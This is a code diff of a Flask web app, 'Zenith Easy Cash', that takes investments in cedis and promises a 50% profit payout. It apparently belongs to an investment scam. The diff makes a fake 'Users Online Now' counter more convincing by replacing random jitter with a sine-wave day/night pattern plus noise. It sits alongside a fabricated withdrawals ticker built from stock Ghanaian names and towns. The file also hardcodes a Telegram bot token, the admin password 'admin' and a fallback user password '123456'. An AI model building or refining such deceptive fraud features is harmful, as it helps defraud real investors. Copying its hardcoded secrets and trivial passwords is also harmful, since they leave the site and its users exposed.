@@ -1,5 +1,6 @@
 from datetime import datetime, timedelta
 import json
+import math
 import os
 import random
 import time
@@ -18,7 +19,7 @@ from flask import (
 from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
-app.secret_key = "zenith_easy_cash_secret_key"
+app.secret_key = "zenith_easy_cash_super_secure_secret_key_change_me"
 
 DATA_FILE = "Master.json"
 SETTINGS_FILE = "settings.json"
@@ -31,8 +32,8 @@ if not os.path.exists(UPLOAD_FOLDER):
 # Default admin credentials
 ADMIN_PASSWORD = "admin"
 
-# --- CONFIGURABLE ONLINE USERS MOCKING ---
-ONLINE_USERS_BASE = 1068
+# --- CONFIGURABLE ONLINE USERS MOCKING (Target: 100 to 1600) ---
+ONLINE_USERS_BASE = 850
 
 # --- TELEGRAM CONFIGURATION ---
 TELEGRAM_BOT_TOKEN = "8986122115:AAEDwqKHTTUgtXiR6lEmIRsZleN1XTxWLWw"
@@ -52,7 +53,11 @@ def send_telegram_alert(message, photo_path=None):
       with open(photo_path, "rb") as photo_file:
         requests.post(
             url,
-            data={"chat_id": TELEGRAM_CHAT_ID, "caption": message, "parse_mode": "HTML"},
+            data={
+                "chat_id": TELEGRAM_CHAT_ID,
+                "caption": message,
+                "parse_mode": "HTML",
+            },
             files={"photo": photo_file},
             timeout=10,
         )
@@ -116,7 +121,7 @@ def save_investor_data(data):
   save_all_investors(investors)
 
 
-# --- TOP BANNER TICKER FOR REGISTRATION PAGE (SMOOTH CONTINUOUS SCROLLER) ---
+# --- TOP BANNER TICKER FOR REGISTRATION PAGE ---
 ZENITH_ALERTS_TOP_HTML = """
 <style>
     #zenithAlertsBanner {
@@ -290,8 +295,8 @@ HTML_TEMPLATE = """
             <strong>Investment Guidelines & Payout Structure:</strong>
             <ul>
                 <li>Minimum Investment: <strong>200 GHs</strong> | Maximum Investment: <strong>500,000 GHs</strong></li>
-                <li>Standard Returns: <strong>50% Profit Payout</strong> (Round figures like GHs 300, 400, 600, 1,000, 10,000) upon maturity!</li>
-                <li>Bonus Payouts: Referral & Milestone bonuses ranging from <strong>10 to 2,000 cedis</strong> credited instantly.</li>
+                <li>Standard Returns: <strong>50% Profit Payout</strong> upon maturity!</li>
+                <li>Bonus Payouts: Referral & Milestone bonuses credited instantly.</li>
             </ul>
         </div>
 
@@ -321,7 +326,7 @@ HTML_TEMPLATE = """
             </div>
             <div class="form-group">
                 <label>Investment Amount (GHs):</label>
-                <input type="number" name="amount" step="1" min="200" max="500000" required placeholder="Min 200 - Max 500,000 (e.g., 300, 400, 1000)">
+                <input type="number" name="amount" step="1" min="200" max="500000" required placeholder="Min 200 - Max 500,000">
             </div>
             <div class="form-group">
                 <label>Work / Job:</label>
@@ -346,7 +351,6 @@ HTML_TEMPLATE = """
 
         <div class="nav-links">
             <a href="{{ url_for('login') }}">🔑 Investor Login</a>
-            <a href="{{ url_for('track') }}">🔍 Track Investment</a>
         </div>
     </div>
 
@@ -515,7 +519,7 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             <h3 style="color: #00ff66; font-size: 15px; margin-top: 0; border-bottom: 1px solid #333; padding-bottom: 8px;">🟢 Live Zenith Withdrawals</h3>
             <div class="online-counter-badge">
                 <div class="online-dot"></div>
-                <span><span id="onlineCountNum">1,068</span> Users Online Now</span>
+                <span><span id="onlineCountNum">850</span> Users Online Now</span>
             </div>
             <div id="sideTickerList"></div>
         </div>
@@ -539,18 +543,29 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         setInterval(updateTimers, 1000);
         updateTimers();
 
-        // Regulated online users simulator
-        let currentOnline = {{ online_users_base }};
-        function fluctuateOnlineUsers() {
-            const fluctuation = Math.floor(Math.random() * 9) - 4; // fluctuates between -4 and +4
-            currentOnline += fluctuation;
-            if (currentOnline < 850) currentOnline = 880;
+        // Natural Day/Night Sine-Wave Online Users Simulator (Range: 100 to 1600)
+        let smoothOnline = 850;
+        function simulateNaturalOnlineUsers() {
+            const now = new Date();
+            const hours = now.getHours() + now.getMinutes() / 60;
+            
+            // Sine wave peaking around 2:00 PM (14.0) and hitting lowest point at 3:00 AM (3.0)
+            // Formula maps 24 hours smoothly between 100 and 1600 users
+            const targetCycle = 850 + 750 * Math.sin(((hours - 6) / 24) * 2 * Math.PI);
+            
+            // Smoothly drift toward the time-of-day target with organic micro-fluctuations
+            const microNoise = (Math.random() - 0.5) * 6;
+            smoothOnline += (targetCycle - smoothOnline) * 0.05 + microNoise;
+            
+            if (smoothOnline < 100) smoothOnline = 100;
+            if (smoothOnline > 1600) smoothOnline = 1600;
+
             const el = document.getElementById('onlineCountNum');
             if (el) {
-                el.innerText = currentOnline.toLocaleString();
+                el.innerText = Math.round(smoothOnline).toLocaleString();
             }
         }
-        setInterval(fluctuateOnlineUsers, 4000);
+        setInterval(simulateNaturalOnlineUsers, 3000);
 
         const sideNames = ["Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", "Akosua Frimpong", "Esi Dapaah", "Kojo Addo", "Ama Serwaa", "Nii Armah"];
         const sideTowns = ["Accra", "Kumasi", "Takoradi", "Tamale", "Cape Coast", "Sunyani", "Ho", "Tema"];
@@ -885,6 +900,7 @@ def login():
         break
 
     if found:
+      session.permanent = True
       session["investor_number"] = number
       return redirect(url_for("dashboard"))
     else:
@@ -1029,6 +1045,7 @@ def admin_login():
   if request.method == "POST":
     password = request.form.get("password")
     if password == ADMIN_PASSWORD:
+      session.permanent = True
       session["admin_logged_in"] = True
       return redirect(url_for("admin_dashboard"))
     else:
@@ -1048,7 +1065,7 @@ def admin_dashboard():
     if "expected_return" not in inv:
       inv["expected_return"] = inv["amount"] * 1.5
     if "password" not in inv:
-      inv["password"] = "123456" # Fallback for old records
+      inv["password"] = "123456"
 
   settings = load_settings()
   return render_template_string(
